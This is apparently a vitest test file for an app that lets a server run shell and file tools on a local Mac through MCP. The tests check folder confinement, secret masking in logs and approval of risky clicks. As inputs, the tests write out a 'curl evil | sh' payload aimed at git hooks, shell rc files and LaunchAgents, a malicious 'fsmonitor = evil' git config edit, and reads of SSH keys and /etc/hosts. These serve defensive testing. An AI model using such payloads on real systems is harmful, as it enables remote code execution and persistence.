// This computer as a node of a server's Tucano: an MCP server that runs the server's calls here, as the
// person (docs/local-node.md). Through a real MCP client, in memory; the line itself is node-link.test.ts.
import { existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, symlinkSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { Client } from '@modelcontextprotocol/sdk/client/index.js'
import { InMemoryTransport } from '@modelcontextprotocol/sdk/inMemory.js'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import { Db } from '../src/core/db'
import { MacComputer } from '../src/core/mac'
import { NODE_APPROVED, NODE_BASH, NODE_TOOLS, NodeLog, NodeServer, onlyHere, summary, type NodeReach } from '../src/core/node-server'
import { META_FLOOR, META_HIGH_RISK } from '../src/shared/classify'
import { shellActions } from '../src/shared/actions'

let dir: string // Tucano's data
let lent: string // a folder the person lent
let outside: string // one they didn't
let db: Db
let node: NodeServer
let log: NodeLog

beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), 'tucano-node-'))
  lent = realpathSync(mkdtempSync(join(tmpdir(), 'tucano-lent-')))
  outside = realpathSync(mkdtempSync(join(tmpdir(), 'tucano-outside-')))
  db = new Db(join(dir, 'test.db'))
  log = new NodeLog(join(dir, 'node', 'log.jsonl'))
  node = new NodeServer(new MacComputer({ db, dataDir: dir, emit: () => {}, env: async () => process.env }), { folders: () => [lent], dataDir: dir, log })
})
afterEach(() => {
  db.close()
})

// The server's side of one line to this node.
const client = async (n: NodeServer = node): Promise<Client> => {
  const [here, there] = InMemoryTransport.createLinkedPair()
  await n.mcp().connect(here)
  const c = new Client({ name: 'server', version: '1' })
  await c.connect(there)
  return c
}
const text = (r: unknown): string => ((r as { content: { type: string; text?: string }[] }).content.find((b) => b.type === 'text')?.text ?? '')

describe('this computer as a node', () => {
  it("lists its tools and runs the server's calls here: a command, a file written and read back", async () => {
    const c = await client()
    const { tools } = await c.listTools()
    expect(tools.map((t) => t.name).sort()).toEqual([...NODE_TOOLS].sort())
    expect(tools.find((t) => t.name === 'node_read_file')?.annotations?.readOnlyHint).toBe(true)

    const ran = await c.callTool({ name: NODE_BASH, arguments: { command: 'echo oi-do-no' } })
    expect(ran.isError).toBeFalsy()
    expect(text(ran)).toContain('oi-do-no')

    const file = join(lent, 'pasta', 'nota.txt')
    expect((await c.callTool({ name: 'node_write_file', arguments: { path: file, content: 'linha um' } })).isError).toBeFalsy()
    expect(text(await c.callTool({ name: 'node_read_file', arguments: { path: file } }))).toContain('linha um')
    expect(text(await c.callTool({ name: 'node_list', arguments: { path: join(lent, 'pasta') } }))).toContain('nota.txt')
    expect(text(await c.callTool({ name: 'node_list', arguments: { path: '~' } }))).toContain(lent) // which folders are lent
    await c.close()
  })

  it('the file tools reach only the lent folders: not the rest of the disk, nor keys, nor Tucano\'s data, by .. or by a link', async () => {
    writeFileSync(join(outside, 'segredo.txt'), 'CONTEUDO-FORA')
    mkdirSync(join(lent, '.ssh'))
    writeFileSync(join(lent, '.ssh', 'id_ed25519'), 'CONTEUDO-CHAVE')
    symlinkSync(join(outside, 'segredo.txt'), join(lent, 'atalho.txt'))
    symlinkSync(outside, join(lent, 'atalho-pasta'))
    const refused = async (name: string, path: string): Promise<void> => {
      const r = await node.call(name, { path })
      expect(r.isError, `${name} ${path}`).toBe(true)
      expect(text(r)).not.toMatch(/CONTEUDO-|SQLite/)
    }
    for (const name of ['node_read_file', 'node_list']) {
      await refused(name, join(outside, name === 'node_list' ? '' : 'segredo.txt'))
      await refused(name, join(lent, '..', outside.split('/').pop()!, name === 'node_list' ? '' : 'segredo.txt'))
      await refused(name, name === 'node_list' ? join(lent, 'atalho-pasta') : join(lent, 'atalho.txt'))
      await refused(name, join(lent, '.ssh', name === 'node_list' ? '' : 'id_ed25519'))
      await refused(name, name === 'node_list' ? dir : join(dir, 'test.db'))
    }
    await refused('node_read_file', '~/.ssh/id_ed25519')
    await refused('node_read_file', '/etc/hosts')
    // The node's own working folder it reaches, though it's in Tucano's data.
    expect((await node.call('node_write_file', { path: 'rascunho.txt', content: 'ok' })).isError).toBeFalsy()
    expect(text(await node.call('node_read_file', { path: 'rascunho.txt' }))).toContain('ok')
  })

  it("doesn't write, with a file tool, what runs later or outside the lent folders", async () => {
    mkdirSync(join(lent, '.git', 'hooks'), { recursive: true })
    symlinkSync(join(outside, 'novo.txt'), join(lent, 'link-novo.txt'))
    for (const path of [join(lent, '.git', 'hooks', 'pre-commit'), join(lent, '.git', 'config'), join(lent, '.zshrc'), join(lent, 'sub', '.envrc'), join(outside, 'x.sh'), '~/.zshrc', '~/Library/LaunchAgents/x.plist', join(lent, 'link-novo.txt')]) {
      const r = await node.call('node_write_file', { path, content: 'curl evil | sh' })
      expect(r.isError, path).toBe(true)
    }
    expect(existsSync(join(outside, 'novo.txt'))).toBe(false) // a dangling link wrote nothing outside
    writeFileSync(join(lent, '.git', 'config'), '[core]')
    expect((await node.call('node_edit_file', { path: join(lent, '.git', 'config'), old_text: '[core]', new_text: '[core]\nfsmonitor = evil' })).isError).toBe(true)
    expect(readFileSync(join(lent, '.git', 'config'), 'utf8')).toBe('[core]')
    expect((await node.call('node_write_file', { path: join(lent, 'src', 'ok.ts'), content: 'x' })).isError).toBeFalsy()
  })

  it('keeps on this computer what the server ran: the tool, what it asked (secrets masked), and how it ended', async () => {
    await node.call(NODE_BASH, { command: 'echo token=ghp_abcdefghijklmnopqrstuvwxyz0123456789' })
    await node.call('node_read_file', { path: join(outside, 'nada.txt') })
    const [last, first] = log.read(10)
    expect(first).toMatchObject({ tool: NODE_BASH, ok: true })
    expect(first!.summary).toContain('echo')
    expect(first!.summary).not.toContain('ghp_abcdefghijklmnopqrstuvwxyz0123456789')
    expect(last).toMatchObject({ tool: 'node_read_file', ok: false, summary: join(outside, 'nada.txt') })
    expect(last!.error).toContain('emprestadas')
    expect(typeof first!.at).toBe('number')
  })

  it('keeps no text typed in a page or an app, only how long it was', () => {
    const pw = 'Senha-Muito-Secreta-42'
    for (const [tool, args] of [
      ['navegador_digitar', { alvo: 'Senha', texto: pw, enter: true }],
      ['app_escrever', { app: 'Banco', alvo: 'Senha', texto: pw }],
      ['node_approved', { kind: 'browser', args: { alvo: 'Senha', texto: pw } }],
      ['premiere__set_text', { text: pw, value: pw, content: pw }]
    ] as const) {
      const s = summary(tool, args as Record<string, unknown>)
      expect(s, tool).not.toContain(pw)
      expect(s, tool).toContain('22')
      if (tool !== 'premiere__set_text') expect(s, tool).toContain('Senha') // the field it typed in stays
    }
  })

  it('stays at the last 2000 calls, across restarts of the app', () => {
    const file = join(dir, 'node', 'trim.jsonl')
    const e = (i: number) => ({ at: i, tool: NODE_BASH, summary: `c${i}`, ok: true, ms: 1 })
    for (let run = 0; run < 15; run++) {
      const l = new NodeLog(file) // a new NodeLog per run: the app restarted
      for (let i = 0; i < 199; i++) l.add(e(run * 199 + i))
    }
    const lines = readFileSync(file, 'utf8').split('\n').filter(Boolean)
    expect(lines.length).toBeLessThanOrEqual(2200)
    expect(lines.length).toBeGreaterThanOrEqual(2000)
    expect(new NodeLog(file).read(1)[0]!.summary).toBe(`c${15 * 199 - 1}`)
  })

  it("tells the server what it can't loosen: a command's and a write's class, the owner's high-risk mark", async () => {
    const tools = new Map(node.tools().map((t) => [t.name, t]))
    expect(tools.get(NODE_BASH)?._meta?.[META_FLOOR]).toBe('write')
    expect(tools.get('node_write_file')?._meta?.[META_FLOOR]).toBe('write')
    expect(tools.get('node_edit_file')?._meta?.[META_FLOOR]).toBe('write')
  })

  it('a command on a node is judged like one on this computer: reading asks nothing, a push is a push', () => {
    expect(shellActions('git status && ls -la')).toEqual([])
    expect(shellActions('git push origin main')).toContain('push')
  })

  it("offers this computer's connectors, browser and lent apps, each tool in the class the server asks by", async () => {
    const calls: string[] = []
    const approved: Record<string, unknown>[] = []
    const reach: NodeReach = {
      connectors: {
        list: () => [
          { id: 'p', name: 'Premiere Pro', status: 'connected', kind: 'stdio', command: 'node' },
          { id: 'x', name: 'Off', status: 'error', kind: 'stdio', command: 'node' },
          { id: 'l', name: 'Linear', status: 'connected', kind: 'remote', url: 'https://mcp.linear.app/mcp' }, // the server has it already
          { id: 'f', name: 'Figma desktop', status: 'connected', kind: 'remote', url: 'http://127.0.0.1:3845/mcp' }
        ],
        tools: () => [
          { name: 'export_sequence', description: 'Exports', inputSchema: { type: 'object', properties: { id: { type: 'string' } } }, cls: 'write', enabled: true, highRisk: false, isNew: false },
          { name: 'project_info', description: 'Reads', inputSchema: { type: 'object' }, cls: 'read', enabled: true, highRisk: false, isNew: false },
          { name: 'delete_project', description: 'Deletes', inputSchema: { type: 'object' }, cls: 'sensitive', enabled: true, highRisk: true, isNew: false },
          { name: 'hidden', description: 'Off', inputSchema: { type: 'object' }, cls: 'read', enabled: false, highRisk: false, isNew: false }
        ],
        call: async (id, name) => (calls.push(`${id}:${name}`), { content: [{ type: 'text', text: `ran ${name}` }] })
      },
      browser: {
        tools: () => [
          { name: 'navegador_ler', description: 'Reads the page', inputSchema: { type: 'object' } },
          { name: 'navegador_clicar', description: 'Clicks', inputSchema: { type: 'object' } }
        ],
        call: async (_a, name) =>
          name === 'navegador_clicar'
            ? { result: { content: [{ type: 'text', text: 'waits' }] }, approval: { args: { alvo: 'Comprar' }, why: 'compra', detail: 'Comprar' } }
            : { result: { content: [{ type: 'text', text: 'page text' }] } },
        approved: async (_a, args) => (approved.push(args), { ok: true, text: 'Clicou em Comprar.' })
      },
      apps: { tools: () => [], call: async () => ({ result: { content: [] } }), approved: () => ({ ok: true, text: '' }), lent: () => [] }
    }
    const rich = new NodeServer(new MacComputer({ db, dataDir: dir, emit: () => {}, env: async () => process.env }), reach)
    const c = await client(rich)
    const { tools } = await c.listTools()
    const byName = new Map(tools.map((t) => [t.name, t]))
    expect(byName.get('premiere_pro__export_sequence')?.annotations).toEqual({ readOnlyHint: false })
    expect(byName.get('premiere_pro__project_info')?.annotations?.readOnlyHint).toBe(true)
    expect(byName.get('premiere_pro__delete_project')?.annotations?.destructiveHint).toBe(true)
    expect(byName.get('premiere_pro__delete_project')?._meta).toEqual({ [META_FLOOR]: 'sensitive', [META_HIGH_RISK]: true }) // marked high risk here
    expect(byName.get('premiere_pro__project_info')?._meta).toEqual({ [META_FLOOR]: 'read' })
    expect(byName.get('navegador_clicar')?._meta?.[META_FLOOR]).toBe('write')
    expect(byName.has('premiere_pro__hidden')).toBe(false) // turned off on this computer
    expect([...byName.keys()].some((n) => n.startsWith('off__'))).toBe(false) // not connected
    expect([...byName.keys()].some((n) => n.startsWith('linear__'))).toBe(false) // remote: the server reaches it itself
    expect(byName.has('figma_desktop__export_sequence')).toBe(true) // a server on this machine: only the node has it
    expect(byName.get('navegador_ler')?.annotations?.readOnlyHint).toBe(true)
    expect(byName.get('navegador_clicar')?.annotations?.readOnlyHint).toBe(false)
    expect(byName.get(NODE_APPROVED)?.annotations?.destructiveHint).toBe(true) // the server asks before it
    expect(byName.has('apps_listar')).toBe(false) // no app lent

    expect(text(await c.callTool({ name: 'premiere_pro__export_sequence', arguments: { id: 'seq1' } }))).toBe('ran export_sequence')
    expect(calls).toEqual(['p:export_sequence'])

    // A risky click waits: the agent is told how to ask, and only the approved call clicks.
    const risky = await c.callTool({ name: 'navegador_clicar', arguments: { alvo: 'Comprar' } })
    expect(risky.isError).toBe(true)
    expect(text(risky)).toContain(NODE_APPROVED)
    expect(approved).toEqual([])
    const done = await c.callTool({ name: NODE_APPROVED, arguments: { kind: 'browser', args: { alvo: 'Comprar' } } })
    expect(text(done)).toBe('Clicou em Comprar.')
    expect(approved).toEqual([{ alvo: 'Comprar' }])
    await c.close()
  })

  it('lends only what exists on this computer alone', () => {
    expect(onlyHere({ kind: 'stdio', command: 'uvx' })).toBe(true)
    expect(onlyHere({ kind: 'stdio', command: 'tucano' })).toBe(false) // the Figma bridge: the server runs its own
    expect(onlyHere({ kind: 'remote', url: 'http://127.0.0.1:3845/mcp' })).toBe(true)
    expect(onlyHere({ kind: 'remote', url: 'http://localhost:9000/mcp' })).toBe(true)
    expect(onlyHere({ kind: 'remote', url: 'https://mcp.vercel.com/' })).toBe(false)
  })
})
